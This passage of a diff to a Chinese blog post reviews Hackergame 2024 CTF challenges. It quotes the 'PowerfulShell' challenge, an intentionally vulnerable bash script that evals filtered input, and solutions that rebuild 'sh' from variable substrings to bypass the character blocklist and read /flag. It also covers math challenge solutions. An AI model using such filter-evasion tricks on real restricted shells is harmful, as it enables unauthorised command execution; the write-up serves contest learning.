class="line">FORBIDDEN_CHARS=&quot;&#x27;\&quot;;,.%^*?!@#%^&amp;()&gt;&lt;\/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0&quot;</span><br><span class="line"></span><br><span class="line">PowerfulShell() &#123;</span><br><span class="line">    while true; do</span><br><span class="line">        echo -n &#x27;PowerfulShell@hackergame&gt; &#x27;</span><br><span class="line">        if ! read input; then</span><br><span class="line">            echo &quot;EOF detected, exiting...&quot;</span><br><span class="line">            break</span><br><span class="line">        fi</span><br><span class="line">        if [[ $input =~ [$FORBIDDEN_CHARS] ]]; then</span><br><span class="line">            echo &quot;Not Powerful Enough :)&quot;</span><br><span class="line">            exit</span><br><span class="line">        else</span><br><span class="line">            eval $input</span><br><span class="line">        fi</span><br><span class="line">    done</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PowerfulShell</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>这里贴出Powershell代码 可以看到禁用了非常多的字符</p>
+<p>检查环境发现~的目录是&#x2F;players 已知$- &#x3D; hB</p>
+<p>有以下构造</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__=~</span><br><span class="line">___=$-</span><br><span class="line">____=$[-1+1]</span><br><span class="line">`$&#123;__:7:1&#125;$&#123;___:____:1&#125;`</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>构造了一个sh指令 后续就是简单的cd ..和cat &#x2F;flag了</p>
+</blockquote>
+<blockquote>
+<p>YUKI.N:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PowerfulShell@hackergame&gt; ~</span><br><span class="line">/players/PowerfulShell.sh: line 16: /players: Is a directory</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>所以我们可以构造执行 <code>ls ~</code> ，再拿到它的结果：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PowerfulShell@hackergame&gt; _1=~</span><br><span class="line">PowerfulShell@hackergame&gt; _2=$&#123;_1:2:1&#125;</span><br><span class="line">PowerfulShell@hackergame&gt; _3=$&#123;_1:7:1&#125;</span><br><span class="line">PowerfulShell@hackergame&gt; _4=`$_2$_3 ~`</span><br><span class="line">PowerfulShell@hackergame&gt; $_4</span><br><span class="line">/players/PowerfulShell.sh: line 16: PowerfulShell.sh: command not found</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>通过 <code>sh</code> 即可获得 shell，并在里面读取 flag：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PowerfulShell@hackergame&gt; _5=$&#123;_4:14:2&#125;</span><br><span class="line">PowerfulShell@hackergame&gt; $_5</span><br><span class="line">cat /flag</span><br><span class="line">flag&#123;N0w_I_Adm1t_ur_tru1y_5He11_m4ster_bae08a2ded&#125;</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<h2 id="math"><a href="#math" class="headerlink" title="math"></a>math</h2><h3 id="强大的正则表达式"><a href="#强大的正则表达式" class="headerlink" title="强大的正则表达式"></a>强大的正则表达式</h3><blockquote>
+<p>官方题解：</p>
+<p>第一问，由于判断一个十进制数是否整除 16 只需要看最后四位，所以枚举所有符合条件的最后四位，构造对应的正则表达式就可以了。严格来说还要考虑不足四位的情况，但是测试数据里面出现这种情况的概率很小，忽略掉也是通过的。</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;(0|1|2|3|4|5|6|7|8|9)*&#x27;</span> + <span class="string">&#x27;(&#x27;</span> + <span class="string">&#x27;|&#x27;</span>.join(<span class="string">f&#x27;<span class="subst">&#123;i:04d&#125;</span>&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10000</span>, <span class="number">16</span>)) + <span class="string">&#x27;)&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p>正则表达式一直是我的弱项，之前一直靠GPT来解决，现在GPT也无法解决的情况出现后，就无法应对了</p>
+<p>在写这道题时，我在网上找到了16的倍数的判断方法，但始终无法用正则表达式表示下来</p>
+<p>这段程序跑下来应该是这样的</p>
+<p><code>(0|1|2|3|4|5|6|7|8|9)*(0000|0016|0032|0048|0064|0080|0096|0112|0128|0144|0160|0176|0192|0208|0224|0240|0256|0272|0288|0304|0320|0336|0352|0368|0384|0400|0416|0432|0448|0464|0480|0496|0512|0528|0544|0560|0576|0592|0608|0624|0640|0656|0672|0688|0704|0720|0736|0752|0768|0784|0800|0816|0832|0848|0864|0880|0896|0912|0928|0944|0960|0976|0992|1008|1024|1040|1056|1072|1088|1104|1120|1136|1152|1168|1184|1200|1216|1232|1248|1264|1280|1296|1312|1328|1344|1360|1376|1392|1408|1424|1440|1456|1472|1488|1504|1520|1536|1552|1568|1584|1600|1616|1632|1648|1664|1680|1696|1712|1728|1744|1760|1776|1792|1808|1824|1840|1856|1872|1888|1904|1920|1936|1952|1968|1984|2000|2016|2032|2048|2064|2080|2096|2112|2128|2144|2160|2176|2192|2208|2224|2240|2256|2272|2288|2304|2320|2336|2352|2368|2384|2400|2416|2432|2448|2464|2480|2496|2512|2528|2544|2560|2576|2592|2608|2624|2640|2656|2672|2688|2704|2720|2736|2752|2768|2784|2800|2816|2832|2848|2864|2880|2896|2912|2928|2944|2960|2976|2992|3008|3024|3040|3056|3072|3088|3104|3120|3136|3152|3168|3184|3200|3216|3232|3248|3264|3280|3296|3312|3328|3344|3360|3376|3392|3408|3424|3440|3456|3472|3488|3504|3520|3536|3552|3568|3584|3600|3616|3632|3648|3664|3680|3696|3712|3728|3744|3760|3776|3792|3808|3824|3840|3856|3872|3888|3904|3920|3936|3952|3968|3984|4000|4016|4032|4048|4064|4080|4096|4112|4128|4144|4160|4176|4192|4208|4224|4240|4256|4272|4288|4304|4320|4336|4352|4368|4384|4400|4416|4432|4448|4464|4480|4496|4512|4528|4544|4560|4576|4592|4608|4624|4640|4656|4672|4688|4704|4720|4736|4752|4768|4784|4800|4816|4832|4848|4864|4880|4896|4912|4928|4944|4960|4976|4992|5008|5024|5040|5056|5072|5088|5104|5120|5136|5152|5168|5184|5200|5216|5232|5248|5264|5280|5296|5312|5328|5344|5360|5376|5392|5408|5424|5440|5456|5472|5488|5504|5520|5536|5552|5568|5584|5600|5616|5632|5648|5664|5680|5696|5712|5728|5744|5760|5776|5792|5808|5824|5840|5856|5872|5888|5904|5920|5936|5952|5968|5984|6000|6016|6032|6048|6064|6080|6096|6112|6128|6144|6160|6176|6192|6208|6224|6240|6256|6272|6288|6304|6320|6336|6352|6368|6384|6400|6416|6432|6448|6464|6480|6496|6512|6528|6544|6560|6576|6592|6608|6624|6640|6656|6672|6688|6704|6720|6736|6752|6768|6784|6800|6816|6832|6848|6864|6880|6896|6912|6928|6944|6960|6976|6992|7008|7024|7040|7056|7072|7088|7104|7120|7136|7152|7168|7184|7200|7216|7232|7248|7264|7280|7296|7312|7328|7344|7360|7376|7392|7408|7424|7440|7456|7472|7488|7504|7520|7536|7552|7568|7584|7600|7616|7632|7648|7664|7680|7696|7712|7728|7744|7760|7776|7792|7808|7824|7840|7856|7872|7888|7904|7920|7936|7952|7968|7984|8000|8016|8032|8048|8064|8080|8096|8112|8128|8144|8160|8176|8192|8208|8224|8240|8256|8272|8288|8304|8320|8336|8352|8368|8384|8400|8416|8432|8448|8464|8480|8496|8512|8528|8544|8560|8576|8592|8608|8624|8640|8656|8672|8688|8704|8720|8736|8752|8768|8784|8800|8816|8832|8848|8864|8880|8896|8912|8928|8944|8960|8976|8992|9008|9024|9040|9056|9072|9088|9104|9120|9136|9152|9168|9184|9200|9216|9232|9248|9264|9280|9296|9312|9328|9344|9360|9376|9392|9408|9424|9440|9456|9472|9488|9504|9520|9536|9552|9568|9584|9600|9616|9632|9648|9664|9680|9696|9712|9728|9744|9760|9776|9792|9808|9824|9840|9856|9872|9888|9904|9920|9936|9952|9968|9984)</code></p>
+<p>确实很抽象</p>
+<p>后面两问已经没有胆量去研究了</p>
+<h3 id="优雅的不等式"><a href="#优雅的不等式" class="headerlink" title="优雅的不等式"></a>优雅的不等式</h3><blockquote>
+<p>官方题解：</p>
+<p>从代码注释给出的样例输入可以看出，将四分之一圆减去其内接三角形转换成定积分形式就能证明 pi≥2，显然构造一个可以被四分之一圆覆盖并且面积等于 2&#x2F;3 的函数图像就可以证明 pi≥8&#x2F;3，一个很容易想到的例子就是抛物线 f(x)&#x3D;1−x**2，刚好可以满足要求，于是提交函数 <code>4*((1-x**2)**(1/2)-(1-x**2))</code> 就可以完成证明。经过测试，一些大语言模型可以直接构造出这个函数。</p>
+</blockquote>
+<p>自从开始刷知乎，我就经常看见这种证明，当时就挺好奇的，这下也算是解惑了，不过这样的证明明显也需要“注意力惊人“，不是我这样的数学渣渣可以解触的。后两问也就不继续看了</p>
+<h3 id="关灯"><a href="#关灯" class="headerlink" title="关灯"></a>关灯</h3><blockquote>
+<p>官方题解：</p>
+<p>经典版本关灯游戏的解法可以在网络上找到很多资料，3D 版本关灯游戏解法也是类似的。第一问只有 3^3&#x3D;27 个灯，可以直接枚举全部可能的操作，一共是 2^27&#x3D;134217728 种情况。第二问有 5^3&#x3D;125 个灯，直接枚举是不行的，但是可以只枚举最上面一层的操作，一共 5^2&#x3D;25 个灯，然后逐层推导出其它地方的操作，那么只需要枚举 225&#x3D;33554432 种情况。第三问有 113&#x3D;1331 个灯，只枚举一层 112&#x3D;121 个灯也是不现实的，但是可以把问题转换为异或方程组求解，使用高斯消元算法就能直接解出答案，整体算法复杂度是 O(n^9)，所需计算次数的量级是 2e9，是可以接受的。</p>
+</blockquote>
+<p>最开始分析这个题时，觉得是算法题，上网查过一些资料后才发现是数学问题，遂放弃。</p>
+<p>不过第一问还是挣扎过的，就是电脑性能不太行，时间内爆不出来，也还是放弃了。</p>
 
         </div>
 
@@ -360,7 +472,7 @@
         
             <li>
                 <strong>更新于
-                    :</strong> 2024-11-09 20:32:02
+                    :</strong> 2024-11-10 00:27:02
             </li>
         
         <li>
@@ -484,7 +596,7 @@
     <div class="post-toc">
         <div class="toc-title">目录</div>
         <div class="page-title">Hackergame 2024 个人复盘</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%AF%94%E5%A4%A7%E5%B0%8F%E7%8E%8B"><span class="nav-text">比大小王</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Node-js-is-Web-Scale"><span class="nav-text">Node.js is Web Scale</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PaoluGPT"><span class="nav-text">PaoluGPT</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%96%9C%E6%AC%A2%E5%81%9A%E7%AD%BE%E5%88%B0%E7%9A%84-CTFer-%E4%BD%A0%E4%BB%AC%E5%A5%BD%E5%91%80"><span class="nav-text">喜欢做签到的 CTFer 你们好呀</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%AA%E4%BA%BAWP"><span class="nav-text">个人WP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AF%94%E5%A4%A7%E5%B0%8F%E7%8E%8B"><span class="nav-text">比大小王</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Node-js-is-Web-Scale"><span class="nav-text">Node.js is Web Scale</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PaoluGPT"><span class="nav-text">PaoluGPT</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%96%9C%E6%AC%A2%E5%81%9A%E7%AD%BE%E5%88%B0%E7%9A%84-CTFer-%E4%BD%A0%E4%BB%AC%E5%A5%BD%E5%91%80"><span class="nav-text">喜欢做签到的 CTFer 你们好呀</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B5%9B%E5%90%8E%E6%84%9F%E6%83%B3"><span class="nav-text">赛后感想</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WP%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%A4%8D%E7%8E%B0"><span class="nav-text">WP学习与复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A6%81%E6%AD%A2%E5%86%85%E5%8D%B7"><span class="nav-text">禁止内卷</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LESS-%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E5%99%A8%E5%9C%A8%E7%BA%BF%E7%89%88"><span class="nav-text">LESS 文件查看器在线版</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#general"><span class="nav-text">general</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8D%E5%AE%BD%E7%9A%84%E5%AE%BD%E5%AD%97%E7%AC%A6"><span class="nav-text">不宽的宽字符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PowerfulShell"><span class="nav-text">PowerfulShell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#math"><span class="nav-text">math</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%BA%E5%A4%A7%E7%9A%84%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="nav-text">强大的正则表达式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%98%E9%9B%85%E7%9A%84%E4%B8%8D%E7%AD%89%E5%BC%8F"><span class="nav-text">优雅的不等式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E7%81%AF"><span class="nav-text">关灯</span></a></li></ol></li></ol></li></ol>
 
     </div>
 </div>
